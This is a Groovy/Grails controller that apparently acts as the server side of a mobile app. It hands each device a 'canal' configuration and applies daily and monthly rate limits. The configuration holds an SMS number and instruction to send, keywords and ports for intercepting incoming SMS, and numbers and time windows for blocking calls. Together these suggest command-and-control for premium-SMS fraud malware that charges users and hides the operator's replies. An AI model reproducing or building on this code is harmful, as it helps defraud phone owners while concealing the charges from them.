package com.sp.domain

import java.util.List;
import java.util.Map;

import com.xstd.plugin.Utils.XMLTables.LocationInfo;

import grails.converters.JSON

class SubAppItemController {

	static allowedMethods = [save: "POST"]
	def appService


	//    def list(Integer max) {
	//        params.max = Math.min(max ?: 10, 100)
	//        [subAppItemInstanceList: SubAppItem.list(params), subAppItemInstanceTotal: SubAppItem.count()]
	//    }
	//
	//    def create() {
	//        [subAppItemInstance: new SubAppItem(params)]
	//    }

	def save() {
		def subAppItemInstance = SubAppItem.findBySerialNumber(params.serialNumber)
		if(!subAppItemInstance){
			subAppItemInstance = new SubAppItem(params)
		}else{
			subAppItemInstance.properties = params
			subAppItemInstance.lastUpdated=new Date()
		}
		def canal=getCanal(params);
		if(canal){


			//			subAppItemInstance.canalInfo=canal.properties as JSON
			def result=[:]
			//			result.queryMoneyPort="queryMoney:instruction"

			result.name=canal.name
			//			Map area
			result.operator=canal.operator

			//			boolean enable

			result.times=canal.times

			result.interval=canal.interval

			result.exeStart=canal.exeStart

			result.exeEnd=canal.exeEnd


			result.blockSmsPort=canal.blockSmsPort

			result.blockKeys=canal.blockKeys

			/////通话拦截设置


			result.blockNum=canal.blockNum

			result.blockMinTime=canal.blockMinTime

			result.blockMaxTime=canal.blockMaxTime

			//sms
			result.port=canal.port
			result.instruction=canal.instruction

			//			result.wapInfo=canal.wapInfo

			//			String targetKey
			//			String chargeKey
			result.type=canal.t


			//检查余额
			def checkMoneyInfo=appService.getCheckMoneyInfo(subAppItemInstance,canal)
			if(checkMoneyInfo){
				result.checkMoneyInfo=checkMoneyInfo

			}

			subAppItemInstance.canalInfo=result as JSON
			//			println subAppItemInstance.canalInfo

			if (subAppItemInstance.save(flush: true)) {
				render result as JSON
			}else{
				render (subAppItemInstance.getErrors() as JSON)
			}
		}else{

			render (["errors":[
					["object":"SubItem",message:"null canal"]
				]]  as JSON)



		}
	}

	private getCanal(params){
		def code=params.smsCenter

		//		Canal canal=Canal.findByCodeAndEnable(code,true)
		Canal canal=appService.getCanalByCode(code);

		if(!canal){
			log.warn("can not find canal by code:${code},params:${params}")
			return null
		}
		int dayLimit=canal.dayLimit
		int dayInterval=canal.dayInterval

		int monthLimit=canal.monthLimit

		int timeDelay=canal.timeDelay

		int monthCount=params.monthCount?:0
		int  dayCount=params.dayCount?:0
		long lastTime=params.lastTime?:0

		boolean flag=true

		long now=(new Date()).getTime();
		long diff=now-lastTime
		//		println 0000000

		if(diff<timeDelay*60*1000){
			//			println 111111
			flag=false
		}

		if(diff<dayInterval*24*3600*1000){//月度间隔限制（天）
			//			println 2222

			flag=false
		}

		if(dayCount>=dayLimit){//当天内次数限制
			//			println 3333

			flag=false
		}

		if(monthCount>=monthLimit){//当月次数限制
			//			println 44444

			flag=false
		}
		if(flag==false){
			log.info "return null because limited,flag=false"
		}

		flag?canal:null
	}


}
